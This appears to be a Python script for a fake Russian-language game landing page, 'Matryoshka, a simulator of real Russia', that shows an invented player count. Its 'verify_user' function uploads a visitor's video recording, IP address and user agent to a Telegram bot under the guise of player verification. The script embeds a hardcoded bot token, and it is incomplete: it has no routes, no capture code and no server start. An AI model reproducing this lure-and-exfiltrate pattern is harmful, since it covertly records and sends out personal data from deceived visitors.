#!/usr/bin/env python3
import os
import json
import requests
from datetime import datetime
from socket import gethostbyname, gethostname

# Конфигурация приложения
config = {
    'site_name': 'Матрешка — симулятор настоящей России',
    'players_count': '4 083',
    'domain': 'myrussiansim.local',
    'telegram': {
        'bot_token': '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig',
        'chat_id': '4798745489'
    }
}

def get_server_urls():
    """Возвращает доступные URL сервера"""
    try:
        local_ip = gethostbyname(gethostname())
    except:
        local_ip = '127.0.0.1'
    
    return {
        'custom_domain': f"http://{config.get('domain', 'localhost')}:5000",
        'local': "http://127.0.0.1:5000",
        'network': f"http://{local_ip}:5000"
    }

def verify_user(video_file, ip, user_agent):
    """Отправка видео в Telegram"""
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{config['telegram']['bot_token']}/sendVideo",
            files={'video': (f'verify_{datetime.now().strftime("%Y%m%d_%H%M%S")}.webm', video_file, 'video/webm')},
            data={
                'chat_id': config['telegram']['chat_id'],
                'caption': f"🔔 Новый игрок!\n🕒 {datetime.now()}\n🌐 IP: {ip}\n📱 {user_agent}"
            },
            timeout=30
        )
        return {"status": "success" if response.ok else "error"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_html():
    """Генерирует HTML страницу"""
    urls = get_server_urls()
    return f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{config['site_name']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            color: white;
            text-align: center;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
        }}
        h1 {{
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }}
        .promo-btn {{
            display: inline-block;
            background: #ff4d4d;
            color: white;
            padding: 15px 30px;
            margin: 20px 0;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            font-size: 1.2em;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .players-count {{
            font-size: 1.5em;
            margin: 30px 0;
        }}
        .start-btn {{
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            width: 200px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .tagline {{
            font-style: italic;
            margin-top: 40px;
            font-size: 1.1em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{config['site_name']}</h1>
        
        <a href="#" class="promo-btn">СМОТРЕТЬ ПРОМО-РОЛИК</a>
        
        <div class="players-count">
            сейчас в игре<br>
            {config['players_count']}
        </div>
        
        <button class="start-btn" onclick="startGame()">Начать игру</button>
        
        <div class="tagline">
            Всегда хотел ощутить атмосферу настоящей России
        </div>
    </div>

    <script>
        function startGame() {{
            // Здесь будет ваша логика начала игры
            alert("Игра начинается!");
        }}
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("Сервер готов к работе!")
    print(f"Доступ по адресу: http://localhost:5000")
    print(f"Текущие игроки: {config['players_count']}")
